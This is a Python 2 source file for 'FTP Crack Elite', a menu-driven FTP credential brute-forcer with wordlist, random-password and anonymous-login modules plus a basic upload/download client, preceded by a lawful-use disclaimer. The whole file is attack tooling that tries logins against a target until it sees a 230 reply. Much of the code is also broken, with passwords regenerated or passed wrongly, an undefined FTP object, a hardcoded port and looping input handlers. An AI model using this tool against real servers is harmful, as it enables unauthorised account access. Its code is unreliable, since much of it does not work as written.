import socket

import re

import sys

from random import choice
from string import ascii_letters
from string import digits

import argparse
import sys
from ftplib import FTP
from termcolor import colored
from colorama import Fore, Back, Style

def connect(username, password, ip, port, lengthpass):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    password = (''.join(choice(ascii_letters + digits) for i in range(lengthpass)))
    print "[*] Trying to connect to host " + ip +":"+port + " using username: " + username + " password: " + password
    s.connect((ip, 21))
    data = s.recv(1024)

    s.send("USER " + username + '\r\n')
    data = s.recv(1024)

    s.send('PASS ' + password + '\r\n')
    data = s.recv (1024)
	

    s.send('QUIT\r\n')
    data = s.recv (3)	

   
    s.close()
    return data


def brute(ip, port, user, lengthpass):
	username = user
	passwords = (''.join(choice(ascii_letters + digits) for i in range(lengthpass)))
	for password in passwords:
    		attempt = connect(username, password, ip, port, lengthpass)
		
    		if attempt=="230":
			print "[!] Stopping service"
        		print "[!] Password found: " + password + "For username: " + username
        		sys.exit(0)




def ftp_login_wordlist(target, username, password):
    try:
    	print "[*] Trying to connect to host " + target + " using username: " + username + "and password: " + password
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
	print "[!] Stopping service"
        print "[!] Password found: " + password + "For username: " + username
        sys.exit(0)
    except:
        pass


def brute_force_wordlist(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login_wordlist(target, username, word)

    except:
        print "\n[-] There is no such wordlist file. \n"
	comBrute(ip, port, user, passstyle, wordlist, lengthpass)








def modBrute():
	print ('  ___  ___  __  ____________________  ___  _________  ')
        print (' / _ )/ _ \/ / / /_  __/ __/ __/ __ \/ _ \/ ___/ __/  ')
	print (' / _  / , _/ /_/ / / / / _// _// /_/ / , _/ /__/ _/    ')
	print ('/____/_/|_|\____/_/_/_/___/_/ _\____/_/|_|\___/___/    ')
	print ('       /  |/  / __ \/ _ \/ / / / /  / __/              ')
	print ('      / /|_/ / /_/ / // / /_/ / /__/ _/                ')
	print ('     /_/  /_/\____/____/\____/____/___/                ')
                                                    
	print ("")
	print ("")












	print ('Please Select a Command from the List: ')
	print ('')
	print ('1) show options: Displays the options for the module')
	print ('2) set host: sets the ip address')
	print ('3) set user: sets the username to test')
	print ('4) set password: sets the password attack style')
	print ('5) set port: sets the port')
	print ('6) exploit: begins bruteforce')
	print ('')
	print ('99) back: goes back home')
	print ('')
	print ('')
	command = raw_input('FTPCE(bruteforce)>')




	user = ""
	port = ""
	ip = ""
	passstyle = ""
	wordlist = ""
	lengthpass = 8
	
	if command == "set host":
			ip = raw_input('ip address of host: ')
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)

	if command == "set port":
			port = raw_input('port of ftp server[usually 21]: ')
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)

	if command == "set user":
			user = raw_input('username to test: ')
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)


	if command == "exploit":
		if passstyle == "1":
			brute_force_wordlist(ip, user, wordlist)
		if passstyle == "2":
			brute(ip, port, user, lengthpass)
	
	if command == "set password":
			print ('Options')
			print ("")
			print ("1) Use word list")
			print ("2) Generate random passwords")
			passstyle = raw_input("Type selected option number: ")
			if passstyle == "1":
				wordlist = raw_input("Type in name of word list in same directory: ")
				comBrute(ip, port, user, passstyle, wordlist, lengthpass)
			if passstyle == "2":
				lengthpass = int(raw_input("Please select length of random password: "))
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)
			


	if command == "show options":
			print ""
			print "Options: "
			print "--------------------------------"
			print ""
			print "ip: " + ip
			print "port: " + port
			print "user: " + user
			if passstyle == "":
				print("Password attack style: ")
				print ("")
			if passstyle == "1":
				print("The selected wordlist: " + wordlist)
				print ("")
			if passstyle == "2":
				print("The random password length: ")
				print(lengthpass)
				print("")
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)

		
	else:
		print "[-] ERROR, please check list of commands again"
		comBrute(ip, port, user, passstyle, wordlist, lengthpass)



def 	comBrute(ip, port, user, passstyle, wordlist, lengthpass):
	command = raw_input('FTPCE(bruteforce)>')
	if command == "set host":
			ip = raw_input('ip address of host: ')
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)

	if command == "set port":
			port = raw_input('port of ftp server[usually 21]: ')
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)

	if command == "set user":
			user = raw_input('username to test: ')
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)


	if command == "exploit":
		if passstyle == "1":
			brute_force_wordlist(ip, user, wordlist)
		if passstyle == "2":
			brute(ip, port, user, lengthpass)
	
	if command == "set password":
			print ('Options:')
			print ("")
			print ("1) Use word list")
			print ("2) Generate random passwords")
			print ("")
			passstyle = raw_input("Type selected option number: ")
			if passstyle == "":
				print ("Password attack style: ")
			if passstyle == "1":
				wordlist = raw_input("Type in name of word list in same directory: ")
				comBrute(ip, port, user, passstyle, wordlist, lengthpass)
			if passstyle == "2":
				lengthpass = int(raw_input("Please select length of random password: "))
				comBrute(ip, port, user, passstyle, wordlist, lengthpass)
			


	if command == "show options":
			print ""
			print "Options: "
			print "--------------------------------"
			print ""
			print "ip: " + ip
			print "port: " + port
			print "user: " + user
			if passstyle == "":
				print("Password attack style: ")
				print ("")
			if passstyle == "1":
				print("The selected wordlist: " + wordlist)
				print ("")
			if passstyle == "2":
				print("The random password length: ")
				print(lengthpass)
				print("")
			
			comBrute(ip, port, user, passstyle, wordlist, lengthpass)

	else:
		print "[-] ERROR, please check list of commands again"
		comBrute(ip, port, user, passstyle, wordlist, lengthpass)

def connectAnon(username, password, ip, port,):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[*] Trying to connect to host " + ip +":"+port + " using username: " + username + " password: " + password
    s.connect((ip, 21))
    data = s.recv(1024)

    s.send("USER " + username + '\r\n')
    data = s.recv(1024)

    s.send('PASS ' + password + '\r\n')
    data = s.recv (1024)
	

    s.send('QUIT\r\n')
    data = s.recv (3)	

   
    s.close()
    return data


def bruteAnon(ip, port):
	username = "anonymous"
	passwords = ['', 'anonymous']
	for password in passwords:
    		attempt = connectAnon(username, passwords, ip, port)
		
    		if attempt=="230":
			print "[!] Stopping service"
        		print "[!] Password found: " + password + "For username: " + username
        		sys.exit(0)


def modAnon():

	port = ""
	ip = ""
	
	ip = raw_input('ip address of host: ')
	port = raw_input('port of ftp server[usually 21]: ')
	print "[*] Checking for default accounts"
	bruteAnon(ip, port)

def modConnectFTP():
	print "           _____ _____ ____ "           
	print"          |  ___|_   _|  _  |           "
	print"          | |_    | | | |_) |          "
	print"   ____   |  _|   | | |  __/       _   "
	print"  / ___|__|_|_ __ |_|_|_| ___  ___| |_ "
	print" | |   / _ /| '_ /| '_ / / _ // __| __|"
	print" | |__| (_) | | | | | | |  __/ (__| |_ "
	print" |____/___/|_| |_|_| |_|/___|/___|/__|"
	print ""
	print ""
	ip = raw_input("What is host address: ")
	port = int(raw_input("What is the host port: "))
	user = raw_input("What is the username of account on the server: ")
	password = raw_input("What is the password of the account on the server: ")
	directory = raw_input("What is the directory of the FTP: ")
	connectedFTP(ip, port, user, password, directory)

def connectedFTP(ip, port, user, password, directory):
	ftp = FTP('')
	ftp.connect(ip , port)
	ftp.login(user, password)
	ftp.cwd(directory) #replace with your directory
	ftp.retrlines('LIST')

	print "Commands:"
	print ""
	print "load: loads a local file to the server"
	print "download: loads a file from the computer to yours for the ftp directory"
	print "Connected to server " + ip
	command = raw_input("FTPCE(connect)> ")
	if command == "upload":
		uploadFile(ip, port, user, password, directory)
	if command == "download":
		downloadFile(ip, port, user, password, directory)


def uploadFile(ip, port, user, password, directory):

	filename = raw_input("Enter name of file in your home folder: ") 
	ftp.storbinary('STOR '+filename, open(filename, 'rb'))
	ftp.quit()
	connectedFTP(ip, port, user, password, directory)

def downloadFile(ip, port, user, password, directory):
	filename = raw_input("Enter name of file in ftp directory: ") 
	localfile = open(filename, 'wb')
	ftp.retrbinary('RETR ' + filename, localfile.write, 1024)
	ftp.quit()
	localfile.close()
	connectedFTP(ip, port, user, password, directory)


	


def legalInput():
	print "Copyright 2017, The FTP Crack Elite (FTPCE) by Koziol-Tech, LLC"
	print "All rights reserved."
	print ""
	print "Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:"
	print ""
	print "    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer."
	print "    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution."
	print "    * Neither the name of FTP Crack Elite nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission."
	print ""
	print "THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
	print ""
	print "The above licensing was taken from the BSD licensing and is applied to FTP Crack Elite as well."
	print ""
	print "Note that the FTP Crack Elite is provided as is, and is a royalty free open-source application."
	print ""
	print "Feel free to modify, use, change, market, do whatever you want with it as long as you give the appropriate credit where credit is due (which means giving the authors the credit they deserve for writing it)."
	print "The FTP Crack Elite is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. "
	print(Fore.RED + 'By hitting yes, you agree to the terms of service and that you will only use this tool for lawful purposes only.')

	print ""
	input()

def credit():
	print "2017 Koziol Tech"
	print "Lead Developer: Jakub Koziol"
	print "Version 0.1"
	print ""
	print ""
	input()



def input():
	command = raw_input('FTPCE> :')
	if command == "list":
		print ""
		print"Modules:"
		print("")
		print "bruteForce: Bruteforces a ftp server"
		print "anon: Checks for default account exploit on some unsecure servers"
		print "connect(BETA): connects to ftp server and lets you upload and download files from it"
		print("")
		print("")
		print("")
		input()
	if command == "load":
		print "select module to load from list" 
		mod = raw_input('FTPCE(Load)>')
		if mod == "bruteforce":
			modBrute()
		if mod == "anon":
			modAnon()
		if mod == "connect":
			modConnectFTP()
		if mod == "back":
			input()
		else:
			print "[-] Error no module with that name"
			mod = raw_input('FTPCE(Load)>')
		
	if command == "help":
		print "To use FTP Crack Elite first find a module to load, to find a module type list to view them all"
		print "Once you have found a module type command load, press enter, then input module name"
		print "Once the module has been loaded follow the inscructions in the module"
		print "Commands:"
		print "list: list modules"
		print "load: loads a module"
		print "help: shows help"
		print "quit: quits program"
	if command == "quit":
		print "[*] Thank you for using FTP Crack Elite, good luck!"
		sys.exit()
	if command == "legal":
		legalInput()
	if command == "credit":
		credit()
	while command != "load" or command != "list" or command != "help" or command != "quit":
		print "[-] ERROR, command not found"
		input()

		
		


	



def main():
	
	print colored("    ________________________________  _________                       __   " , 'yellow')
	print colored("    \_   _____/\__    ___/\______   \ \_   ___ \____________    ____ |  | __", 'yellow')
	print colored("     |    __)    |    |    |     ___/ /    \  \/\_  __ \__  \ _/ ___\|  |/ /", 'yellow')
	print colored("     |     \     |    |    |    |     \     \____|  | \// __ ||  \___|    < ", 'yellow')
 	print colored("    \___  /     |____|    |____|      \______  /|__|  (____  /\___  >__|_ |", 'yellow')
   	print  colored( "        \/                                   \/            \/     \/     \/", 'yellow')
        print colored("    		        ___________.__  .__  __"            , 'yellow')                 
	print colored("          		\_   _____/|  | |__|/  |_  ____"   , 'yellow')   
	print colored("          		|    __)_ |  | |  \   __\/ __ \  "                   , 'yellow')
        print colored("          		|        \|  |_|  ||  | \  ___/  "                  , 'yellow')
        print colored("          		/_______  /|____/__||__|  \___  > "                  , 'yellow')
        print colored("         		        \/                    \/   ", 'yellow')   
           

	print ""
	print colored("    [---]              FTP Crack Elite (FTPCE)                [---]", 'blue')
	print colored("    [---]       Developed by: Jakub Koziol(Koziol Tech)       [---]", 'blue')
	print colored("                            Version: 0.1", 'blue')
	print colored("    [---]          GitHub: http://mygitpage.com/my            [---]", 'blue')
	print ""    
	print colored( "          	   Welcome to FTP Crack Elite (FTPCE).", "green")
	print colored( "          The FTP Crack Elite is a product of Koziol Tech LLC.", 'green')
	print ""
	print colored("    To Update FTP Crack Elite visit our Git-Hub for the newest release", 'green')
	print colored("	    	       http://my git hub.com/git", 'green')
	print ""
	print "Please select a command from the menu:"
	print ""
	print "1) list: list modules"
	print "2) load: loads a module"
	print "3) back: goes back to the last page"
	print "4) help: shows help"
	print "5) credit: shows the credits for the program"
	print "6) legal: shows the terms and conditions for the program"
	print ""
	print "99) quit: quits program"
	print ""
	print ""
	input()



def legal():
	print "Copyright 2017, The FTP Crack Elite (FTPCE) by Koziol-Tech, LLC"
	print "All rights reserved."
	print ""
	print "Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:"
	print ""
	print "    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer."
	print "    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution."
	print "    * Neither the name of FTP Crack Elite nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission."
	print ""
	print colored("THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.", 'green')
	print ""
	print "The above licensing was taken from the BSD licensing and is applied to FTP Crack Elite as well."
	print ""
	print "Note that the FTP Crack Elite is provided as is, and is a royalty free open-source application."
	print ""
	print "Feel free to modify, use, change, market, do whatever you want with it as long as you give the appropriate credit where credit is due (which means giving the authors the credit they deserve for writing it)."
	print "The FTP Crack Elite is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. "
	print colored('By hitting yes, you agree to the terms of service and that you will only use this tool for lawful purposes only.', 'red')

	print ""
	print colored("Please type yes(y), to confirm the terms or no(n) to deny. Yes(y) or No(n)", 'green')
	legal = raw_input()
	if legal == "Yes" or legal == "y" or legal == "yes" or legal == "Y":
		main()

	while legal != "Yes" or legal != "y" or legal != "yes" or legal != "Y":
        	sys.exit(0)

	
	
legal()
	
